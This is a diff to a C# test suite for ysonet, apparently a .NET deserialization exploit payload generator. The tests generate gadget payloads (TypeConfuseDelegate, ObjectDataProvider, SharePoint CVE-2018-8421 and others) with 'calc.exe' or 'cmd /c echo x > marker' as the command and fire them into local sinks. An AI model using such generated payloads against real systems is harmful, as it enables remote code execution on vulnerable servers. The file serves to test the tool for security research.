+                    "the echoed command line carries the container: " + line);
+            }
+        }
+
+        // A variant can declare which of the gadget's own options it does not use
+        // (GadgetVariant.WithoutOptions), the gadget-side counterpart of a plugin mode's
+        // option list. The data model must default to "every option applies", so the
+        // gadgets that declare nothing - almost all of them - are untouched.
+        private static void VariantOptionScopeDataModel()
+        {
+            var plain = new GadgetVariant(1, "plain");
+            AssertTrue(plain.UnusedOptions.Count == 0, "a variant declares no unused option by default");
+            AssertTrue(plain.UsesOption("anything"), "a variant with no declaration uses every option");
+            AssertTrue(plain.UsesOption(null), "a null option name is not treated as excluded");
+
+            var scoped = new GadgetVariant(2, "scoped").WithoutOptions("rootcontainer", "");
+            AssertEqual(1, scoped.UnusedOptions.Count, "an empty name is ignored, a real one is kept");
+            AssertTrue(!scoped.UsesOption("rootcontainer"), "the declared option is excluded");
+            AssertTrue(!scoped.UsesOption("RootContainer"), "the match is case-insensitive");
+            AssertTrue(scoped.UsesOption("variant"), "an undeclared option still applies");
+
+            // The wiring: the TFRP wrapper of both consumers is the only declaration today.
+            foreach (string gadget in XamlContainerGadgets)
+            {
+                var variants = Gadget(gadget).Variants();
+                AssertTrue(variants[0].UsesOption(RootContainerOption),
+                    gadget + " variant 1 (TypeConfuseDelegate wrapper) uses the root container");
+                AssertTrue(!variants[1].UsesOption(RootContainerOption),
+                    gadget + " variant 2 (TextFormattingRunProperties wrapper) declares it unused");
+            }
+        }
+
+        // The editor must act on that declaration: with the TFRP wrapper selected the
+        // setting disappears, and a value left over from the other wrapper must NOT reach
+        // the command line. Switching back brings it and its value back.
+        private static void EditorHidesAnOptionTheVariantDoesNotUse()
+        {
+            foreach (string gadget in XamlContainerGadgets)
+            {
+                var ed = new ModuleEditor(null, null, true, null, null);
+                var fields = ed.BuildFieldsForTest(gadget);
+                EditableField command = FindEditable(fields, "command");
+                if (command != null) command.Value = "calc.exe";
+
+                EditableField variant = FindEditable(fields, "variant");
+                EditableField container = FindEditable(fields, RootContainerOption);
+                var declared = Gadget(gadget).Variants();
+
+                // Variant 1: visible, and it reaches the command line.
+                variant.Value = declared[0].Label;
+                container.Value = "2";
+                string withWrapper = ed.GadgetCommandLineForTest();
+                AssertTrue(!container.Hidden, gadget + " shows the container for the TCD wrapper");
+                AssertTrue(withWrapper.Contains(RootContainerFlag + " 2"),
+                    gadget + " emits the container for the TCD wrapper: " + withWrapper);
+
+                // Variant 2: hidden, and the carried-over value is dropped.
+                variant.Value = declared[1].Label;
+                string tfrpLine = ed.GadgetCommandLineForTest();
+                AssertTrue(container.Hidden, gadget + " hides the container for the TFRP wrapper");
+                AssertTrue(!tfrpLine.Contains(RootContainerFlag),
+                    gadget + " does not emit the container for the TFRP wrapper: " + tfrpLine);
+
+                // Back again: the setting and its value return, so hiding never destroys input.
+                variant.Value = declared[0].Label;
+                string backLine = ed.GadgetCommandLineForTest();
+                AssertTrue(!container.Hidden, gadget + " shows the container again for the TCD wrapper");
+                AssertTrue(backLine.Contains(RootContainerFlag + " 2"),
+                    gadget + " keeps the container value across a variant round trip: " + backLine);
+            }
+
+            // A gadget whose variants declare nothing keeps every option visible, for every
+            // variant. ObjectDataProvider has four variants and one plain option.
+            var odpEd = new ModuleEditor(null, null, true, null, null);
+            var odpFields = odpEd.BuildFieldsForTest("ObjectDataProvider");
+            EditableField xamlurl = FindEditable(odpFields, "xamlurl");
+            EditableField odpVariant = FindEditable(odpFields, "variant");
+            AssertTrue(xamlurl != null && odpVariant != null, "ObjectDataProvider offers xamlurl and variant");
+            foreach (GadgetVariant v in Gadget("ObjectDataProvider").Variants())
+            {
+                odpVariant.Value = v.Label;
+                odpEd.RefreshDynamicForTest();
+                AssertTrue(!xamlurl.Hidden,
+                    "ObjectDataProvider variant " + v.Number + " declares no unused option, so xamlurl stays visible");
+            }
+        }
+
+        // The XAML wrapper payload fires INSIDE a deserialization callback and then
+        // fail-fasts the CLR, so -t used to kill ysonet.exe with no message right after
+        // printing the payload. The gadget now declares SelfTestNeedsChildProcess, which
+        // routes the self-test through a child ysonet process. The proof is that this
+        // process is still alive to assert afterwards: before the fix, generating with
+        // Test=true here took the whole test runner down.
+        private static void XamlWrapperSelfTestSurvivesTheHostProcess()
+        {
+            var gen = GadgetRegistry.CreateGadgetInstance("ActivitySurrogateDisableTypeCheck") as GenericGenerator;
+            AssertTrue(gen != null, "the gadget loads");
+
+            InputArgs probe = new InputArgs();
+            probe.Cmd = "calc.exe";
+            probe.Test = true;
+            AssertTrue(gen.SelfTestNeedsChildProcess("BinaryFormatter", probe),
+                "variant 1 declares that its self-test needs a child process");
+
+            InputArgs ia = new InputArgs();
+            ia.Cmd = "calc.exe";     // ignored by this gadget
+            ia.Test = true;          // the whole point: run the self-test
+            RunResult r = PayloadRunner.GenerateGadget(new GenerationRequest
+            {
+                GadgetName = "ActivitySurrogateDisableTypeCheck",
+                FormatterName = "BinaryFormatter",
+                OutputFormat = "",
+                InputArgs = ia,
+            });
+
+            AssertTrue(r.Success, "the payload is still produced with -t: " + r.ErrorMessage);
+            AssertTrue(!RawIsEmpty(r.Raw), "the payload is non-empty with -t");
+
+            // The TFRP wrapper does not need isolation, and asking for it must not have
+            // leaked onto every gadget.
+            var tfrp = GadgetRegistry.CreateGadgetInstance("ActivitySurrogateDisableTypeCheck") as GenericGenerator;
+            tfrp.Options().Parse(new[] { "--variant", "2" });
+            AssertTrue(!tfrp.SelfTestNeedsChildProcess("BinaryFormatter", probe),
+                "the TextFormattingRunProperties wrapper self-tests in-process as before");
+            AssertTrue(!((GenericGenerator)GadgetRegistry.CreateGadgetInstance("TypeConfuseDelegate")).SelfTestNeedsChildProcess("BinaryFormatter", probe),
+                "an ordinary gadget still self-tests in-process");
+        }
+
+        // The isolated self-test deserializes in a child process with a PLAIN formatter, so
+        // a gadget that installs its own SerializationBinder (PSObject's LocalBinder resolves
+        // the bundled vulnerable assembly, which a plain deserialize would miss) would be
+        // tested against different types than it ships. GenericGenerator refuses that pair
+        // outright rather than reporting a self-test that proved something else. No real
+        // gadget combines them, so the guard is proven with a fake that deliberately does.
+        private static void IsolatedSelfTestRefusesACustomBinder()
+        {
+            var fake = new ysonet.Tests.Helpers.TestingArena.IsolatedSelfTestWithBinderFakeGenerator();
+
+            InputArgs noTest = new InputArgs();
+            noTest.Test = false;
+            object payload = fake.Generate("BinaryFormatter", noTest);
+            AssertTrue(!RawIsEmpty(payload), "without -t the pair is irrelevant and the payload is produced");
+
+            InputArgs withTest = new InputArgs();
+            withTest.Test = true;
+            Exception caught = null;
+            try { new ysonet.Tests.Helpers.TestingArena.IsolatedSelfTestWithBinderFakeGenerator().Generate("BinaryFormatter", withTest); }
+            catch (Exception ex) { caught = ex; }
+
+            AssertTrue(caught != null, "-t on a binder + isolated self-test pair is refused");
+            AssertTrue(caught.Message.IndexOf("SerializationBinder", StringComparison.OrdinalIgnoreCase) >= 0,
+                "the refusal names the reason: " + caught.Message);
+
+            // And the real gadgets that DO use isolation install no binder, so none of them
+            // can hit that refusal.
+            InputArgs probe = new InputArgs();
+            probe.Cmd = "calc.exe";
+            probe.Test = false;
+            foreach (string gadget in XamlContainerGadgets)
+            {
+                var g = GadgetRegistry.CreateGadgetInstance(gadget) as GenericGenerator;
+                AssertTrue(g.SelfTestNeedsChildProcess("BinaryFormatter", probe),
+                    gadget + " uses the isolated self-test");
+                AssertTrue(g.serializationBinder == null,
+                    gadget + " installs no SerializationBinder, so the isolated self-test is valid for it");
+            }
         }
 
         private static void OptionHeuristics()
@@ -2742,7 +5515,7 @@ namespace ysonet.Tests
 
         private static void WizardRunAllFormattersToFolder()
         {
-            string folder = Path.Combine(Path.GetTempPath(), "ysonet_raf_test");
+            string folder = TestArtifactPath("ysonet_raf_test");
             if (Directory.Exists(folder))
                 Directory.Delete(folder, true);
 
@@ -2825,7 +5598,7 @@ namespace ysonet.Tests
 
         private static bool WinformsPayloadTriggers()
         {
-            string marker = Path.Combine(Path.GetTempPath(), "ysonet_clip_winforms.txt");
+            string marker = TestArtifactPath("ysonet_clip_winforms.txt");
             if (File.Exists(marker)) File.Delete(marker);
 
             InputArgs ia = new InputArgs();
@@ -2843,14 +5616,15 @@ namespace ysonet.Tests
             // A target reading GetData(format) deserializes it with BinaryFormatter.
             RunSTA(delegate { using (var ms = new MemoryStream(bytes)) { bf.Deserialize(ms); } });
 
-            bool ran = WaitForFile(marker, 2500);
+            // Only ever asserted positively, so it gets the full marker budget.
+            bool ran = WaitForFile(marker, MarkerWaitMs);
             if (File.Exists(marker)) File.Delete(marker);
             return ran;
         }
 
         private static bool WpfXamlPayloadRuns(int variant, bool restrictive)
         {
-            string marker = Path.Combine(Path.GetTempPath(),
+            string marker = TestArtifactPath(
                 "ysonet_clip_wpf_" + variant + "_" + (restrictive ? "r" : "n") + ".txt");
             if (File.Exists(marker)) File.Delete(marker);
 
@@ -2869,7 +5643,10 @@ namespace ysonet.Tests
                 else SerializersHelper.Xaml_deserialize(xaml);
             });
 
-            bool ran = WaitForFile(marker, 2500);
+            // The restrictive case asserts ABSENCE, so it keeps a short bound (waiting
+            // longer for something that must never appear only slows the suite). The
+            // non-restrictive case must fire, so it gets the full marker budget.
+            bool ran = WaitForFile(marker, restrictive ? 2500 : MarkerWaitMs);
             if (File.Exists(marker)) File.Delete(marker);
             return ran;
         }
@@ -2877,17 +5654,46 @@ namespace ysonet.Tests
         // Run an action on an STA thread (WPF XamlReader and WinForms deserialization
         // expect it). Swallows exceptions: a gadget may throw after it fires, so the
         // marker file, not the return, is the proof.
+        // Exceptions are swallowed on purpose: most gadgets throw AFTER firing, so a
+        // throw here is not evidence that the payload failed. The cost is that a real
+        // harness bug inside the delegate (a bad cast, a wrong payload shape) is
+        // reported only as the generic "marker not created" and looks exactly like a
+        // payload that did not fire. Under YSONET_TRACE the swallowed exception is
+        // printed, so that case can be diagnosed without editing this file.
         private static void RunSTA(System.Threading.ThreadStart action)
         {
+            bool traceThrows = Environment.GetEnvironmentVariable("YSONET_TRACE") != null;
             var t = new System.Threading.Thread(delegate ()
             {
                 try { action(); }
-                catch (Exception) { }
+                catch (Exception ex)
+                {
+                    if (traceThrows)
+                    {
+                        Console.Error.WriteLine("    [sta-throw] " + ex.GetType().Name + ": " + ex.Message);
+                        Console.Error.Flush();
+                    }
+                }
             });
             t.SetApartmentState(System.Threading.ApartmentState.STA);
             t.Start();
             t.Join();
         }
+
+        // How long a fired payload gets to drop its marker file (or directory).
+        //
+        // The payload spawns a real process (`cmd /c echo x > marker`), so the marker
+        // lands asynchronously and this budget is pure wall clock. A short budget is a
+        // false-negative generator: on a loaded machine a run reported 34 "marker not
+        // created" failures while EVERY one of those markers was in fact written a few
+        // seconds later. The proof was the leftover files - the finally-delete ran
+        // before the write, so the marker survived the test that had already given up.
+        //
+        // Raising the ceiling does not weaken anything: a healthy row still has to
+        // produce the marker, and WaitForFile polls every 100ms so it returns the
+        // moment the file appears. The cost is paid only when a payload genuinely does
+        // not fire, which is exactly when waiting longer is worth it.
+        private const int MarkerWaitMs = 15000;
 
         private static bool WaitForFile(string path, int totalMs)
         {
@@ -2909,7 +5715,7 @@ namespace ysonet.Tests
             // mitigated framework it blocks silently (no throw); older ones may throw.
             // Either way the gadget must not execute, so we assert on a marker file
             // that only a fired gadget would create, not on an exception.
-            string marker = Path.Combine(Path.GetTempPath(), "ysonet_restrictive_xaml_test.txt");
+            string marker = TestArtifactPath("ysonet_restrictive_xaml_test.txt");
             if (File.Exists(marker)) File.Delete(marker);
 
             InputArgs ia = new InputArgs();
@@ -3229,24 +6035,104 @@ namespace ysonet.Tests
                 "surviving content is kept after the guarded re-parse: " + malformed);
         }
 
-        // Locks the NetNonRceGadgets Xaml minify path. Its --minify block used to handle only
-        // the two JSON formatters, so the Xaml (XML) payloads passed through unchanged. All three
-        // gadgets must now come out smaller AND well-formed when minified. Firing the minified
-        // Xaml is covered in PayloadsFireIntoTestSinks.
-        private static void NetNonRceXamlMinifies()
+        private static void NonRcePayloadsAreGadgets()
         {
-            Type ptype = PluginRegistry.CreatePluginInstance("NetNonRceGadgets").GetType();
+            AssertTrue(!PluginRegistry.PluginExists("NetNonRceGadgets"),
+                "the former NetNonRceGadgets plugin is no longer registered");
+
+            IGenerator pictureBox = Gadget("PictureBox");
+            IGenerator progress = Gadget("InfiniteProgressPage");
+            IGenerator fileLog = Gadget("FileLogTraceListener");
+            AssertEqual(CommandInputType.Url, pictureBox.CommandInput(), "PictureBox takes a URL");
+            AssertEqual(CommandInputType.Url, progress.CommandInput(), "InfiniteProgressPage takes a URL");
+            // Target-side, not local: the directory is created by the DESERIALIZING
+            // process, and nothing is read on the operator machine.
+            AssertEqual(CommandInputType.TargetPath, fileLog.CommandInput(), "FileLogTraceListener takes a target path");
+
+            GadgetCapability pictureBoxCapability = GadgetFacetReader.Expand(pictureBox)[0];
+            GadgetCapability progressCapability = GadgetFacetReader.Expand(progress)[0];
+            GadgetCapability fileLogCapability = GadgetFacetReader.Expand(fileLog)[0];
+            AssertTrue(pictureBoxCapability.Kinds.Contains(PayloadKind.Network), "PictureBox is a network gadget");
+            AssertTrue(progressCapability.Kinds.Contains(PayloadKind.Network), "InfiniteProgressPage is a network gadget");
+            AssertTrue(fileLogCapability.Kinds.Contains(PayloadKind.FileSystem), "FileLogTraceListener is a file-system gadget");
+            AssertSetEqual(fileLogCapability.Inputs, new[] { PayloadInput.TargetPath },
+                "FileLogTraceListener's accepted input is a target path");
+            // It deliberately does NOT declare denial-of-service. That facet drives the
+            // DosPolicy safeguards (refusal without --i-understand-dos, exclusion from
+            // every bulk run), which are for a payload whose purpose is to take the
+            // target down. Here the denial of service is a conditional consequence of
+            // where the directory is created, so it is stated in AdditionalInfo instead.
+            AssertTrue(!fileLogCapability.Kinds.Contains(PayloadKind.DenialOfService),
+                "FileLogTraceListener is not gated as a denial-of-service gadget");
+            AssertTrue(fileLog.AdditionalInfo().ToLowerInvariant().Contains("denial of service"),
+                "the possible denial-of-service effect is still disclosed in AdditionalInfo");
+
+            foreach (IGenerator gadget in new[] { pictureBox, progress, fileLog })
+            {
+                var formatters = new List<string>();
+                foreach (string formatter in gadget.SupportedFormatters())
+                    formatters.Add(GadgetFacetReader.CleanFormatter(formatter));
+                foreach (string expected in new[] { "Json.NET", "FastJson", "JavaScriptSerializer", "YamlDotNet", "Xaml" })
+                    AssertTrue(formatters.Contains(expected), gadget.Name() + " supports " + expected);
+
+                bool shouldHaveMessagePack = gadget.Name() != "InfiniteProgressPage";
+                foreach (string messagePack in new[] { "MessagePackTypeless", "MessagePackTypelessLz4" })
+                    AssertEqual(shouldHaveMessagePack, formatters.Contains(messagePack),
+                        gadget.Name() + " MessagePack support is effect-proven");
+
+                AssertTrue(formatters.Contains("SharpSerializerXml"),
+                    gadget.Name() + " SharpSerializer XML support preserves setter order");
+                AssertTrue(!formatters.Contains("SharpSerializerBinary"),
+                    gadget.Name() + " does not claim unproven SharpSerializer binary support");
+
+                bool shouldHaveDataContractJson = gadget.Name() == "FileLogTraceListener";
+                AssertEqual(shouldHaveDataContractJson, formatters.Contains("DataContractJsonSerializer"),
+                    gadget.Name() + " DataContractJson support is effect-proven");
+                foreach (string dataContractXml in new[] { "DataContractSerializer", "NetDataContractSerializer" })
+                    AssertTrue(!formatters.Contains(dataContractXml),
+                        gadget.Name() + " does not claim DataContract XML support that bypasses the effect");
+            }
+        }
+
+        // Every text formatter exposed by the non-RCE gadgets has a safe minifier.
+        // End-to-end firing of both minify states is covered in PayloadsFireIntoTestSinks.
+        private static void NonRcePayloadsMinify()
+        {
             foreach (string gadget in new[] { "PictureBox", "InfiniteProgressPage", "FileLogTraceListener" })
             {
-                ResetPluginStatics(ptype);
-                RunResult plain = PayloadRunner.RunPlugin("NetNonRceGadgets", new[] { "-g", gadget, "-f", "Xaml", "-i", "http://localhost/y" });
-                ResetPluginStatics(ptype);
-                RunResult min = PayloadRunner.RunPlugin("NetNonRceGadgets", new[] { "-g", gadget, "-f", "Xaml", "-i", "http://localhost/y", "--minify" });
-                AssertTrue(plain.Success && min.Success, gadget + " Xaml generates: " + plain.ErrorMessage + " / " + min.ErrorMessage);
-                AssertTrue(RawLength(min.Raw) < RawLength(plain.Raw),
-                    gadget + " Xaml is minified (" + RawLength(min.Raw) + " < " + RawLength(plain.Raw) + ")");
-                AssertTrue(XmlWellFormednessError(min.Raw) == null,
-                    gadget + " minified Xaml is well-formed XML");
+                var formatters = new List<string> { "Json.NET", "FastJson", "JavaScriptSerializer", "YamlDotNet", "SharpSerializerXml", "Xaml" };
+                // FileLogTraceListener takes a directory path, the other two take a URL.
+                string sample = gadget == "FileLogTraceListener" ? @"C:\ysonet_min_probe" : "http://localhost/y";
+                foreach (string formatter in formatters)
+                {
+                    InputArgs plainInput = new InputArgs();
+                    plainInput.Cmd = sample;
+                    RunResult plain = PayloadRunner.GenerateGadget(new GenerationRequest
+                    {
+                        GadgetName = gadget,
+                        FormatterName = formatter,
+                        InputArgs = plainInput,
+                    });
+
+                    InputArgs minInput = new InputArgs();
+                    minInput.Cmd = sample;
+                    minInput.Minify = true;
+                    RunResult min = PayloadRunner.GenerateGadget(new GenerationRequest
+                    {
+                        GadgetName = gadget,
+                        FormatterName = formatter,
+                        InputArgs = minInput,
+                    });
+
+                    AssertTrue(plain.Success && min.Success, gadget + " " + formatter + " generates: " + plain.ErrorMessage + " / " + min.ErrorMessage);
+                    AssertTrue(RawLength(min.Raw) < RawLength(plain.Raw),
+                        gadget + " " + formatter + " is minified (" + RawLength(min.Raw) + " < " + RawLength(plain.Raw) + ")");
+                    if (formatter == "Xaml" || formatter == "SharpSerializerXml")
+                    {
+                        AssertTrue(XmlWellFormednessError(min.Raw) == null,
+                            gadget + " minified " + formatter + " is well-formed XML");
+                    }
+                }
             }
         }
 
@@ -3266,8 +6152,8 @@ namespace ysonet.Tests
         // End-to-end execution of the compressed payload is covered by PayloadsFireIntoTestSinks.
         private static void DataSetFromFileCompressedIsSmaller()
         {
-            string cs = Path.Combine(Path.GetTempPath(), "ysonet_dsff_compress_fixture.cs");
-            File.WriteAllText(cs, "public class YsonetCompressFixture { public YsonetCompressFixture() { } }");
+            string cs = WriteTestArtifact("ysonet_dsff_compress_fixture.cs",
+                "public class YsonetCompressFixture { public YsonetCompressFixture() { } }");
             try
             {
                 byte[] plain = GenerateDsffFromFile(cs, false);
@@ -3419,10 +6305,13 @@ namespace ysonet.Tests
         private static void EveryGadgetGeneratesAPayload()
         {
             // Fixtures for the file/dll/source input types.
-            string csFixture = Path.Combine(Path.GetTempPath(), "ysonet_gadget_fixture.cs");
-            File.WriteAllText(csFixture, "public class YsonetTestFixture { public YsonetTestFixture() { } }");
+            string csFixture = WriteTestArtifact("ysonet_gadget_fixture.cs",
+                "public class YsonetTestFixture { public YsonetTestFixture() { } }");
             // A real managed PE for gadgets that embed a DLL to load on the target.
             string dllFixture = new Uri(typeof(OptionSet).Assembly.CodeBase).LocalPath;
+            // Text a gadget embeds in its payload (the write operation of
+            // TypeConfuseDelegateFileOperations reads it at generation time).
+            string contentFixture = ContentFixture();
 
             try
             {
@@ -3434,6 +6323,12 @@ namespace ysonet.Tests
                     // "Generic" is the base generator, not a real gadget (the CLI hides
                     // it too); it has no payload to produce.
                     if (name == "Generic") continue;
+
+                    // A denial-of-service gadget is never built by an automatic sweep,
+                    // so no test needs an acknowledgement to pass. The skip is derived
+                    // from facets, never from a name list, and DosGadgetsAreContained
+                    // proves the exclusion instead of leaving it to convention.
+                    if (DosPolicy.IsDosGadget(name)) continue;
 
                     IGenerator g = GadgetRegistry.CreateGadgetInstance(name);
                     AssertTrue(g != null, "gadget loads: " + name);
@@ -3447,7 +6342,7 @@ namespace ysonet.Tests
                     string formatter = formatters[0].Split(' ')[0];
 
                     InputArgs ia = new InputArgs();
-                    ia.Cmd = SampleInputForGadget(g.CommandInput(), csFixture, dllFixture);
+                    ia.Cmd = SampleInputForGadget(g.CommandInput(), csFixture, dllFixture, contentFixture);
 
                     GenerationRequest req = new GenerationRequest
                     {
@@ -3465,12 +6360,34 @@ namespace ysonet.Tests
             finally
             {
                 try { File.Delete(csFixture); } catch { }
+                try { File.Delete(contentFixture); } catch { }
             }
         }
 
         // A valid sample input for a gadget's declared command-input type. Nothing here
-        // reaches the network; file/dll/source inputs point at local fixtures.
-        private static string SampleInputForGadget(CommandInputType t, string csFixture, string dllFixture)
+        // reaches the network, nothing is created on this machine, and file/dll/source
+        // inputs point at local fixtures.
+        //
+        // The three target-path forms use names beginning with 'z' on purpose. A gadget
+        // built on the sorted-container primitive requires its FIRST argument to sort
+        // strictly after its second with String.CompareOrdinal (see
+        // TypeConfuseDelegateFileOperations), so the sample target path has to sort above
+        // both the sample destination ("aa...") and the content fixture's text ("AAA...").
+        private const string SampleTargetPath = "zz_ysonet_target.txt";
+        private const string SampleTargetPathPair = "zz_ysonet_source.txt;aa_ysonet_destination.txt";
+
+        // The text of ContentFixture(): deliberately starts with a high-sorting-below
+        // 'A' so any 'z' target path sorts after it ordinally.
+        private const string SampleContentFixtureText =
+            "AAA ysonet content fixture\r\nsecond line\r\n";
+
+        private static string ContentFixture()
+        {
+            return WriteTestArtifact("ysonet_content_fixture.txt", SampleContentFixtureText);
+        }
+
+        private static string SampleInputForGadget(CommandInputType t, string csFixture,
+            string dllFixture, string contentFixture)
         {
             switch (t)
             {
@@ -3480,6 +6397,10 @@ namespace ysonet.Tests
                 case CommandInputType.FilePath: return csFixture;   // any existing local file
                 case CommandInputType.CsSourceFile: return csFixture;
                 case CommandInputType.DllPath: return dllFixture;
+                case CommandInputType.TargetPath: return SampleTargetPath;
+                case CommandInputType.TargetPathPair: return SampleTargetPathPair;
+                case CommandInputType.TargetPathAndLocalFile:
+                    return SampleTargetPath + ";" + contentFixture;
                 default: return "calc.exe";
             }
         }
@@ -3554,8 +6475,7 @@ namespace ysonet.Tests
 
             // GetterCallGadgets reads its inner payload from a file (File.ReadAllText),
             // so it needs one that exists.
-            string innerFixture = Path.Combine(Path.GetTempPath(), "ysonet_plugin_inner.json");
-            File.WriteAllText(innerFixture, "{}");
+            string innerFixture = WriteTestArtifact("ysonet_plugin_inner.json", "{}");
 
             // Harmless hex keys (from the ViewState usage docs) for the crypto plugins.
             const string valKey = "70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0";
@@ -3568,7 +6488,6 @@ namespace ysonet.Tests
                 { "DotNetNuke", new string[] { "-m", "run_command", "-c", "calc.exe" } },
                 { "GetterCallGadgets", new string[] { "-g", "PropertyGrid", "-i", innerFixture } },
                 { "MachineKeySessionSecurityTokenHandler", new string[] { "-c", "calc.exe", "--validationkey", valKey, "--decryptionkey", decKey } },
-                { "NetNonRceGadgets", new string[] { "-g", "PictureBox", "-f", "Json.NET", "-i", "http://localhost/y" } },
                 { "Resx", new string[] { "-M", "BinaryFormatter", "-c", "calc.exe" } },
                 { "SessionSecurityTokenHandler", new string[] { "-c", "calc.exe" } },
                 { "SharePoint", new string[] { "--cve", "CVE-2018-8421", "-c", "calc.exe" } },
@@ -3701,12 +6620,312 @@ namespace ysonet.Tests
                     f.SetValue(null, false);
         }
 
+        // --- Test artifact locations ------------------------------------------------
+        // Every file a test writes (fixture, input, payload, marker, sink folder) goes to
+        // the first writable directory in this chain: workspace-root "temp" (gitignored,
+        // and the folder a maintainer can exclude from antivirus) -> %TEMP% ->
+        // %SystemRoot%\Temp -> C:\temp. Antivirus sometimes deletes a generated payload or
+        // a dropped marker as a false positive right after it is written, so a write is
+        // verified and falls through to the next candidate. This changes only WHERE and how
+        // robustly a file is written; it never loosens a behavioral assertion.
+        // No machine path is ever hardcoded (CLAUDE.md, "No local artifacts in commits").
+
+        private static string _artifactDir;
+
+        // Candidate directories for test artifacts, most-preferred first. Enumeration is
+        // kept separate from the filesystem probe below so the ordering can be tested
+        // without touching disk, and every path is derived - no drive letter is hardcoded.
+        private static IEnumerable<string> TestArtifactDirCandidates()
+        {
+            string ws = FindWorkspaceRoot();
+            if (ws != null) yield return Path.Combine(ws, "temp");
+            yield return Path.GetTempPath();
+            string sysRoot = Environment.GetEnvironmentVariable("SystemRoot");
+            if (!string.IsNullOrEmpty(sysRoot)) yield return Path.Combine(sysRoot, "Temp");
+            // Last resort: a "temp" folder at the root of the system drive (normally
+            // C:\temp), taken from the system path rather than assumed to be C:.
+            string sysDrive = Path.GetPathRoot(string.IsNullOrEmpty(sysRoot) ? Environment.SystemDirectory : sysRoot);
+            if (!string.IsNullOrEmpty(sysDrive)) yield return Path.Combine(sysDrive, "temp");
+        }
+
+        // Walk up from the test exe to the folder holding ysonet.sln. No hardcoded path.
+        private static string FindWorkspaceRoot()
+        {
+            var dir = new DirectoryInfo(AppDomain.CurrentDomain.BaseDirectory);
+            while (dir != null)
+            {
+                if (File.Exists(Path.Combine(dir.FullName, "ysonet.sln"))) return dir.FullName;
+                dir = dir.Parent;
+            }
+            return null;
+        }
+
+        // The directory test artifacts live in: the first candidate that takes a probe
+        // write. Resolved once per run, then reused so every test shares one location.
+        private static string ResolveTestArtifactDir()
+        {
+            if (_artifactDir != null)
+            {
+                try { Directory.CreateDirectory(_artifactDir); return _artifactDir; }
+                catch { _artifactDir = null; } // it vanished; pick again
+            }
+
+            var tried = new List<string>();
+            foreach (string dir in TestArtifactDirCandidates())
+            {
+                if (string.IsNullOrEmpty(dir)) continue;
+                tried.Add(dir);
+                try
+                {
+                    Directory.CreateDirectory(dir);
+                    string probe = Path.Combine(dir, "ysonet_probe_" + Guid.NewGuid().ToString("N") + ".tmp");
+                    File.WriteAllText(probe, "x");
+                    File.Delete(probe);
+                    _artifactDir = dir;
+                    return dir;
+                }
+                catch { /* try the next candidate */ }
+            }
+            throw new IOException("No writable test artifact directory found. Tried: " +
+                string.Join(", ", tried));
+        }
+
+        // A path inside the artifact directory, for a file the TEST does not write itself:
+        // a marker a payload will drop, an output file the tool writes, or a sink folder.
+        private static string TestArtifactPath(string name)
+        {
+            return Path.Combine(ResolveTestArtifactDir(), name);
+        }
+
+        // Write a test artifact and confirm it survived (AV can delete it right away). On
+        // failure or disappearance, fall through to the next candidate directory. Returns
+        // the path written; the caller deletes it in a finally.
+        private static string WriteTestArtifact(string fileName, string content)
+        {
+            return WriteArtifactIn(TestArtifactDirCandidates(), fileName, content, null);
+        }
+
+        // The write itself, over any candidate list. Split out so the fall-through, the
+        // post-write disappearance case, and the final diagnostic can be tested with
+        // made-up candidates instead of whatever this machine happens to have. `survived`
+        // is the "is it still there?" check (File.Exists in real use), which a test
+        // substitutes to stand in for antivirus deleting the file straight after the write.
+        private static string WriteArtifactIn(IEnumerable<string> candidates, string fileName,
+            string content, Func<string, bool> survived)
+        {
+            if (survived == null) survived = File.Exists;
+            var tried = new List<string>();
+            foreach (string dir in candidates)
+            {
+                if (string.IsNullOrEmpty(dir)) continue;
+                tried.Add(dir);
+                try
+                {
+                    Directory.CreateDirectory(dir);
+                    string path = Path.Combine(dir, fileName);
+                    File.WriteAllText(path, content);
+                    if (survived(path)) return path; // survived AV
+                }
+                catch { /* try the next candidate */ }
+            }
+            throw new IOException("Could not create test artifact '" + fileName +
+                "' in any temp location (AV may be deleting it). Tried: " +
+                (tried.Count == 0 ? "(no candidates)" : string.Join(", ", tried)));
+        }
+
         // Write a temp fixture and return its path; the caller deletes it in a finally.
         private static string MakeTempFile(string name, string content)
         {
-            string path = Path.Combine(Path.GetTempPath(), name);
-            File.WriteAllText(path, content);
-            return path;
+            return WriteTestArtifact(name, content);
+        }
+
+        // Leftovers from an earlier run: mostly fire markers that the spawned
+        // "cmd /c echo x > marker" re-creates a moment AFTER the test already deleted it,
+        // plus whatever a crashed or killed run never cleaned up. They never cause a false
+        // pass (every fire helper deletes its marker before firing), but they pile up, so
+        // each run sweeps them once at startup.
+        private static readonly TimeSpan StaleArtifactAge = TimeSpan.FromHours(1);
+
+        private static void SweepStaleTestArtifacts()
+        {
+            int removed = 0;
+            try
+            {
+                foreach (string dir in TestArtifactDirCandidates())
+                    removed += SweepStaleArtifacts(dir, StaleArtifactAge);
+            }
+            catch { /* housekeeping only; never fail a run over it */ }
+            if (removed > 0)
+                Console.Error.WriteLine("[sweep] removed " + removed + " stale test artifact(s) from earlier runs");
+        }
+
+        // Delete the "ysonet_*" files and folders in dir last written more than olderThan
+        // ago, and return how many went. Everything else is left alone. The age rule is what
+        // makes this safe to run while a SECOND suite is live (a Debug build's post-build
+        // tests next to a manual --full run): that run's files are seconds old, not hours.
+        private static int SweepStaleArtifacts(string dir, TimeSpan olderThan)
+        {
+            if (string.IsNullOrEmpty(dir) || !Directory.Exists(dir)) return 0;
+
+            string[] entries;
+            try { entries = Directory.GetFileSystemEntries(dir, "ysonet_*"); }
+            catch { return 0; }
+
+            DateTime cutoff = DateTime.UtcNow - olderThan;
+            int removed = 0;
+            foreach (string entry in entries)
+            {
+                // "ysonet_payloads" / "ysonet_payloads.txt" is the wizard's DEFAULT output
+                // name, so one could be a file the user asked for, not a test artifact.
+                if (Path.GetFileName(entry).StartsWith("ysonet_payloads", StringComparison.OrdinalIgnoreCase))
+                    continue;
+                try
+                {
+                    if (Directory.Exists(entry))
+                    {
+                        if (Directory.GetLastWriteTimeUtc(entry) > cutoff) continue;
+                        Directory.Delete(entry, true);
+                    }
+                    else
+                    {
+                        if (File.GetLastWriteTimeUtc(entry) > cutoff) continue;
+                        File.Delete(entry);
+                    }
+                    removed++;
+                }
+                catch { /* in use, or denied: leave it for the next run */ }
+            }
+            return removed;
+        }
+
+        // The candidate chain is the whole point of the helpers, so lock its shape: the
+        // workspace temp first, then the user temp, then the system Temp, then a temp at the
